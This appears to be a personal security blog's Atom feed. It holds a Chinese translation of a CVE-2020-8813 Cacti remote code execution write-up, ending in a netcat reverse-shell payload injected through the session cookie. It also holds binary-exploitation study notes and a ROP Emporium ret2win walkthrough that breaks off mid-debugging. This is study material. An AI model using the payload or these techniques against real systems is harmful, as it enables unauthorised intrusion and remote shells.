<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>faint-star</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-02-23T14:19:23.847Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>faint-star</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2020-8813</title>
    <link href="http://yoursite.com/2020/02/23/CVE-2020-8813/"/>
    <id>http://yoursite.com/2020/02/23/CVE-2020-8813/</id>
    <published>2020-02-23T12:04:50.000Z</published>
    <updated>2020-02-23T14:19:23.847Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Cacti-v1-2-8-在身份认证情况下的远程代码执行-CVE-2020-8813-搬运，原文见底部链接"><a href="#Cacti-v1-2-8-在身份认证情况下的远程代码执行-CVE-2020-8813-搬运，原文见底部链接" class="headerlink" title="Cacti v1.2.8 在身份认证情况下的远程代码执行(CVE-2020-8813)     (搬运，原文见底部链接)"></a>Cacti v1.2.8 在身份认证情况下的远程代码执行(CVE-2020-8813)     (搬运，原文见底部链接)</h3><ul><li><p>原文见参考链接，这里只是日常练习翻译和学习，部分和原文不一样加入了自己的理解</p></li><li><h4 id="Cacti摘要"><a href="#Cacti摘要" class="headerlink" title="Cacti摘要"></a>Cacti摘要</h4><p>Cacti是一种利用RRDTool的数据存储和绘图功能设计的一个完整的网络绘图解决方案，他提供了快速的轮询器(poll)、高级图形模板和多种数据获取方法和开箱即用的用户管理功能。所有的这些都封装在一个直观且易于使用的接口中，这对于局域网以及具有上千台设备的复杂网络来说都是有意义的。</p></li><li><p>关于exploit</p><p>我通过分析Cacti主函数里的多个函数代码发现了这个漏洞，为了确保远程代码生效，需要联系多个因素，这个漏洞主要发生在攻击者尝试在名为”Cacti”的cookie变量注入恶意代码，而cookie变量在连接一些字符串后会被传递给shell_exec函数，但是当我验证的时候我遇到了一个问题——当我尝试操控cookie的值的时候，访问页面将会拒绝我。所以为了解决这个问题，我发现这个页面可以以”Guest“的方式接入(这样可以不需要身份认证)。所以我构造了自己的exploit链，先访问”Guest”页面(graph_realtime.php)，然后发送恶意请求在主机上执行恶意代码。</p></li></ul><p>  为了顺利达到目的，首先我需要发送一个请求到”user_admin.php”来启用realtime_graph,”Guest”特权然后发送恶意的请求到“graph_realtime.php”页面</p><p>  graph_realtime.php</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* call poller */</span></span><br><span class="line">$graph_rrd = read_config_option(<span class="string">'realtime_cache_path'</span>) . <span class="string">'/user_'</span> . session_id() . <span class="string">'_lgi_'</span> . get_request_var(<span class="string">'local_graph_id'</span>) . <span class="string">'.png'</span>;</span><br><span class="line">$command   = read_config_option(<span class="string">'path_php_binary'</span>);</span><br><span class="line">$args      = sprintf(<span class="string">'poller_realtime.php --graph=%s --interval=%d --poller_id='</span> . session_id(), get_request_var(<span class="string">'local_graph_id'</span>), $graph_data_array[<span class="string">'ds_step'</span>]);</span><br><span class="line">shell_exec(<span class="string">"$command $args"</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* construct the image name  */</span></span><br><span class="line">$graph_data_array[<span class="string">'export_realtime'</span>] = $graph_rrd;</span><br><span class="line">$graph_data_array[<span class="string">'output_flag'</span>]     = RRDTOOL_OUTPUT_GRAPH_DATA;</span><br><span class="line">$null_param = <span class="keyword">array</span>();</span><br></pre></td></tr></table></figure><p>  我们可以看到第3行和第4行，我们接收到一对参数并把它们连接在一起，还有一个get_request_var函数</p><p>  html_utility.php</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_request_var</span><span class="params">($name, $default = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $_CACTI_REQUEST;</span><br><span class="line"> </span><br><span class="line">    $log_validation = read_config_option(<span class="string">'log_validation'</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_CACTI_REQUEST[$name])) &#123;</span><br><span class="line">        <span class="keyword">return</span> $_CACTI_REQUEST[$name];</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (isset_request_var($name)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($log_validation == <span class="string">'on'</span>) &#123;</span><br><span class="line">            html_log_input_error($name);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        set_request_var($name, $_REQUEST[$name]);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> $_REQUEST[$name];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> $default;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  我们看到这个函数会通过另一个函数set_request_var来处理输入和设置参数的值</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_request_var</span><span class="params">($variable, $value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $_CACTI_REQUEST;</span><br><span class="line"> </span><br><span class="line">    $_CACTI_REQUEST[$variable] = $value;</span><br><span class="line">    $_REQUEST[$variable]       = $value;</span><br><span class="line">    $_POST[$variable]          = $value;</span><br><span class="line">    $_GET[$variable]           = $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  所以，回到我们的“graph_realtime.php”文件，我们可以看到我们可以控制的一对输入是</p><ul><li><p>local_graph_id</p></li><li><p>$graph_data_array[‘ds_step’]的值</p><p>但不幸的是，出于几个原因我们并不能那么做，首先我们注意到graph_realtime.php文件的171行使用了sprintf来处理输入，而且第一个参数graph被“local_graph_id”的值来填充了所以我们无法利用他!并且更不幸的是这个值会被函数“get_filter_request_var”过滤：</p><p>html_utility.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_filter_request_var</span><span class="params">($name, $filter = FILTER_VALIDATE_INT, $options = array<span class="params">()</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (isset_request_var($name)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (isempty_request_var($name)) &#123;</span><br><span class="line">            set_request_var($name, get_nfilter_request_var($name));</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">return</span> get_request_var($name);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (get_nfilter_request_var($name) == <span class="string">'undefined'</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>($options[<span class="string">'default'</span>])) &#123;</span><br><span class="line">                set_request_var($name, $options[<span class="string">'default'</span>]);</span><br><span class="line"> </span><br><span class="line">                <span class="keyword">return</span> $options[<span class="string">'default'</span>];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                set_request_var($name, <span class="string">''</span>);</span><br><span class="line"> </span><br><span class="line">                <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (get_nfilter_request_var($name) == <span class="string">'0'</span>) &#123;</span><br><span class="line">                $value = <span class="string">'0'</span>;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (get_nfilter_request_var($name) == <span class="string">'undefined'</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>($options[<span class="string">'default'</span>])) &#123;</span><br><span class="line">                    $value = $options[<span class="string">'default'</span>];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    $value = <span class="string">''</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (isempty_request_var($name)) &#123;</span><br><span class="line">                $value = <span class="string">''</span>;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> ($filter == FILTER_VALIDATE_IS_REGEX) &#123;</span><br><span class="line">                <span class="keyword">if</span> (is_base64_encoded($_REQUEST[$name])) &#123;</span><br><span class="line">                    $_REQUEST[$name] = utf8_decode(base64_decode($_REQUEST[$name]));</span><br><span class="line">                &#125;</span><br><span class="line"> </span><br><span class="line">                $valid = validate_is_regex($_REQUEST[$name]);</span><br><span class="line">                <span class="keyword">if</span> ($valid === <span class="keyword">true</span>) &#123;</span><br><span class="line">                    $value = $_REQUEST[$name];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    $value = <span class="keyword">false</span>;</span><br><span class="line">                    $custom_error = $valid;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> ($filter == FILTER_VALIDATE_IS_NUMERIC_ARRAY) &#123;</span><br><span class="line">                $valid = <span class="keyword">true</span>;</span><br><span class="line">                <span class="keyword">if</span> (is_array($_REQUEST[$name])) &#123;</span><br><span class="line">                    <span class="keyword">foreach</span>($_REQUEST[$name] <span class="keyword">AS</span> $number) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (!is_numeric($number)) &#123;</span><br><span class="line">                            $valid = <span class="keyword">false</span>;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    $valid = <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line"> </span><br><span class="line">                <span class="keyword">if</span> ($valid == <span class="keyword">true</span>) &#123;</span><br><span class="line">                    $value = $_REQUEST[$name];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    $value = <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> ($filter == FILTER_VALIDATE_IS_NUMERIC_LIST) &#123;</span><br><span class="line">                $valid = <span class="keyword">true</span>;</span><br><span class="line">                $values = preg_split(<span class="string">'/,/'</span>, $_REQUEST[$name], <span class="keyword">NULL</span>, PREG_SPLIT_NO_EMPTY);</span><br><span class="line">                <span class="keyword">foreach</span>($values <span class="keyword">AS</span> $number) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!is_numeric($number)) &#123;</span><br><span class="line">                        $valid = <span class="keyword">false</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"> </span><br><span class="line">                <span class="keyword">if</span> ($valid == <span class="keyword">true</span>) &#123;</span><br><span class="line">                    $value = $_REQUEST[$name];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    $value = <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (!cacti_sizeof($options)) &#123;</span><br><span class="line">                $value = filter_var($_REQUEST[$name], $filter);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $value = filter_var($_REQUEST[$name], $filter, $options);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> ($value === <span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($filter == FILTER_VALIDATE_IS_REGEX) &#123;</span><br><span class="line">                $_SESSION[<span class="string">'custom_error'</span>] = __(<span class="string">'The search term "%s" is not valid. Error is %s'</span>, html_escape(get_nfilter_request_var($name)), html_escape($custom_error));</span><br><span class="line">                set_request_var($name, <span class="string">''</span>);</span><br><span class="line">                raise_message(<span class="string">'custom_error'</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                die_html_input_error($name, get_nfilter_request_var($name));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            set_request_var($name, $value);</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">return</span> $value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($options[<span class="string">'default'</span>])) &#123;</span><br><span class="line">            set_request_var($name, $options[<span class="string">'default'</span>]);</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">return</span> $options[<span class="string">'default'</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数将会过滤输入并返回一个干净的变量</p><p>并且第二个变量“$graph_data_array[‘ds_step’]”，也已经通过sprintf被处理成十进制了，所以没法用来注入恶意命令</p><p>所以我们要如何让事情变得可行呢?让我们再次查看代码</p><p>graph_realtime.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* call poller */</span></span><br><span class="line">$graph_rrd = read_config_option(<span class="string">'realtime_cache_path'</span>) . <span class="string">'/user_'</span> . session_id() . <span class="string">'_lgi_'</span> . get_request_var(<span class="string">'local_graph_id'</span>) . <span class="string">'.png'</span>;</span><br><span class="line">$command   = read_config_option(<span class="string">'path_php_binary'</span>);</span><br><span class="line">$args      = sprintf(<span class="string">'poller_realtime.php --graph=%s --interval=%d --poller_id='</span> . session_id(), get_request_var(<span class="string">'local_graph_id'</span>), $graph_data_array[<span class="string">'ds_step'</span>]);</span><br><span class="line">shell_exec(<span class="string">"$command $args"</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* construct the image name  */</span></span><br><span class="line">$graph_data_array[<span class="string">'export_realtime'</span>] = $graph_rrd;</span><br><span class="line">$graph_data_array[<span class="string">'output_flag'</span>]     = RRDTOOL_OUTPUT_GRAPH_DATA;</span><br></pre></td></tr></table></figure><p>我们获得了另一个传递给shell_exec函数的变量——“session_id()”函数的值，这个函数会返回用户当前的session值，那意味着我们可以利用他来注入我们的命令。</p><p>但是如果我们操控session的值我们就无法访问页面因为页面需要用户认证才能访问，所以在一些额外的挖掘软件中我发现了，如果我们启用了“Realtime Graphs” 特殊权限，我们就可以作为”Guest”来访问页面</p><p><img src="https://user-images.githubusercontent.com/42031559/75113134-ddcc1500-5685-11ea-896d-03ece0f7d9c0.png" alt="CVE-2020-8813-1"></p><p>如果没有开启“Guest Realtime Graphs”访问权限：</p><p><img src="https://user-images.githubusercontent.com/42031559/75113175-5337e580-5686-11ea-8e1e-8f0977db45ed.png" alt="CVE-2020-8813-3"></p><p>如果开启</p><p><img src="https://user-images.githubusercontent.com/42031559/75113211-d0635a80-5686-11ea-8fa0-d6175082a7fe.png" alt="CVE-2020-8813-2"></p><p>我们就可以访问到这个页面，现在就可以发送请求到“graph_realtime.php”了。</p></li></ul><ul><li><p>Payload Wirting</p><p>在控制了session值之后，我们需要使用它来获取系统上的代码执行环境，但这个值毕竟是session值，那意味着我们能用的字符受到了限制，所以我们需要编写session友好的Payload来避免注入时，应用将我们的cookie值强制替换</p><p>我们看到应用替换了我们的cookie值，已经不是我们注入的值了，为了解决这个问题我们需要使用定制的Payload。</p><p>为了避免使用空格，我想到了用“${IFS}”bash变量来替换空格，当然我们需要用;来转义命令，比如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;payload</span><br></pre></td></tr></table></figure><p>如果我们想使用netcat来获得一个shell，我们需要使用如下的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;nc$&#123;IFS&#125;-e$&#123;IFS&#125;/bin/bash$&#123;IFS&#125;ip$&#123;IFS&#125;port</span><br></pre></td></tr></table></figure></li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://shells.systems/cacti-v1-2-8-authenticated-remote-code-execution-cve-2020-8813/" target="_blank" rel="noopener">https://shells.systems/cacti-v1-2-8-authenticated-remote-code-execution-cve-2020-8813/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Cacti-v1-2-8-在身份认证情况下的远程代码执行-CVE-2020-8813-搬运，原文见底部链接&quot;&gt;&lt;a href=&quot;#Cacti-v1-2-8-在身份认证情况下的远程代码执行-CVE-2020-8813-搬运，原文见底部链接&quot; class=&quot;heade
      
    
    </summary>
    
    
      <category term="CVE" scheme="http://yoursite.com/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>windows_hack</title>
    <link href="http://yoursite.com/2020/02/08/windows-hack/"/>
    <id>http://yoursite.com/2020/02/08/windows-hack/</id>
    <published>2020-02-07T16:31:26.000Z</published>
    <updated>2020-02-07T16:31:26.561Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>c++_primer</title>
    <link href="http://yoursite.com/2020/02/07/c-primer/"/>
    <id>http://yoursite.com/2020/02/07/c-primer/</id>
    <published>2020-02-07T08:55:59.000Z</published>
    <updated>2020-02-07T08:55:59.545Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>pwn_new</title>
    <link href="http://yoursite.com/2019/12/21/pwn-new/"/>
    <id>http://yoursite.com/2019/12/21/pwn-new/</id>
    <published>2019-12-21T12:40:56.000Z</published>
    <updated>2019-12-25T14:36:49.673Z</updated>
    
    <content type="html"><![CDATA[<h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><ul><li><p>查看内存分布</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/pid/maps</span><br></pre></td></tr></table></figure><p>一般程序每次运行时，全局变量的地址不会变，栈和堆段的地址会变</p></li><li><p>eip：当前程序执行到哪一行</p></li><li><p>ipython计算padding长度</p></li><li><p>/dev/null（垃圾堆）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r &lt; in &gt; /dev/null</span><br></pre></td></tr></table></figure></li><li><p>ltrace查看程序执行了哪些函数，执行了system只是缺少返回地址也就是栈帧平衡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &apos;print &quot;A&quot;x116,&quot;\x30\x86\x04\x08&quot;&apos; | ltrace ./vul</span><br></pre></td></tr></table></figure></li><li><p>DEP：可以写的地方不能跑，可以跑的地方不能写</p></li><li><p>ASLR：每次执行的内存随机，无法预知地址</p></li><li><p>nc(v参数显示详细信息，k保持连接，l监听端口)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -vc ./vul -kl 127.0.0.1 8888</span><br></pre></td></tr></table></figure></li><li><p>ni要跟到函数里面取，si不跟到函数里边去</p></li><li><p>x查看给定地址的内存，10个内存单元，w4字节，x以16进制形式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/10wx $esp</span><br></pre></td></tr></table></figure></li><li><p>运行pidof vul没有进程，但是运行脚本后却有，nc语句只是监听端口，当有人连接上了才运行程序</p></li><li><p>调试操作</p><p>gdb打开一个程序，此时可以下断点，attach到一个进程，这个是远程的，根据本地的源代码决定断点下在哪里。</p></li><li><p>检查指令是否得到执行</p><p>无穷循环</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\xeb\xfe</span><br></pre></td></tr></table></figure><p>Illegal instruction</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\xff\xff\xff</span><br></pre></td></tr></table></figure><p>如果只是一般的字符串崩溃后显示的是Segmentation fault</p></li><li><p>用来代替全局变量的地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/pid/maps</span><br></pre></td></tr></table></figure><p>得到的地址一般从0x0804a000起，因为这个地方一般用来存全局变量，但是里面可能也会有些重要的数据，所以找靠后的地址</p></li><li><p>strace查看程序启用了哪些系统调用</p></li><li><p>0x80系统调用</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">enhex(asm(<span class="string">'int 0x80'</span>))</span><br></pre></td></tr></table></figure></li><li><p>shellcode截断问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">asm(&apos;mov eax,11\n int 0x80&apos;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xor eax,eax</span><br><span class="line">mov al,11</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push 11</span><br><span class="line">pop eax</span><br></pre></td></tr></table></figure></li></ul><h2 id="ROP-Emporium"><a href="#ROP-Emporium" class="headerlink" title="ROP Emporium"></a>ROP Emporium</h2><h3 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h3><ul><li><p>分析</p><p><img src="https://user-images.githubusercontent.com/42031559/71446713-50417700-2761-11ea-90d6-50dda8ef2fb7.png" alt="image">开启了NX，栈上数据不可执行</p><p>用IDA查看一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">pwnme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">"For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stack buffer;\n"</span></span><br><span class="line">    <span class="string">"What could possibly go wrong?"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You there madam, may I have your input please? And don't worry about null bytes, we're using fgets!\n"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&gt; "</span>);</span><br><span class="line">  <span class="keyword">return</span> fgets(&amp;s, <span class="number">50</span>, <span class="built_in">stdin</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序分配了32字节的空间，但fgets可以接收的数据大于这个值（读到<code>\n</code>、<code>n-1</code>个字符、文件末尾时结束），所以会造成栈溢出，我们的目的是查看<code>flag.txt</code></p><p>IDA查看到程序里有现成的函数可以利用，虽然正常情况下，这个函数不会执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ret2win</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Thank you! Here's your flag:"</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">"/bin/cat flag.txt"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用缓冲区溢出，覆盖原本的返回地址，让他跳到ret2win函数执行</p><p>这里主要记录一下调试的细节</p><p>首先下断点，我下在了<code>pwnme</code>函数结尾处（<code>0x08048658</code>），也就是程序接收我们的输入后就停下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:0804864E                 call    _fgets</span><br><span class="line">.text:08048653                 add     esp, 10h</span><br><span class="line">.text:08048656                 nop</span><br><span class="line">.text:08048657                 leave</span><br><span class="line">.text:08048658                 retn</span><br></pre></td></tr></table></figure><p>gdb启动进程，下好断点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">'./ret2win32'</span>)</span><br><span class="line">gdb.attach(r,<span class="string">'b *0x80485d4\n'</span>)</span><br><span class="line">payload = cyclic(<span class="number">100</span>)</span><br><span class="line">pause()</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>弹出gdb调试窗口后backtrace一下，可以看到已经执行到fgets了，进程已启动就跑到这里了，所以断点只能下在fgets的后面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#0  0xf7ef7079 in __kernel_vsyscall ()</span><br><span class="line">#1  0xf7de0cd7 in __GI___libc_read (fd=0x0, buf=0x9ed2160, nbytes=0x1000)</span><br><span class="line">    at ../sysdeps/unix/sysv/linux/read.c:27</span><br><span class="line">#2  0xf7d6d188 in _IO_new_file_underflow (fp=&lt;optimized out&gt;) at fileops.c:531</span><br><span class="line">#3  0xf7d6e2ab in __GI__IO_default_uflow (fp=0xf7ed25c0 &lt;_IO_2_1_stdin_&gt;)</span><br><span class="line">    at genops.c:380</span><br><span class="line">#4  0xf7d61151 in __GI__IO_getline_info (fp=0xf7ed25c0 &lt;_IO_2_1_stdin_&gt;, </span><br><span class="line">    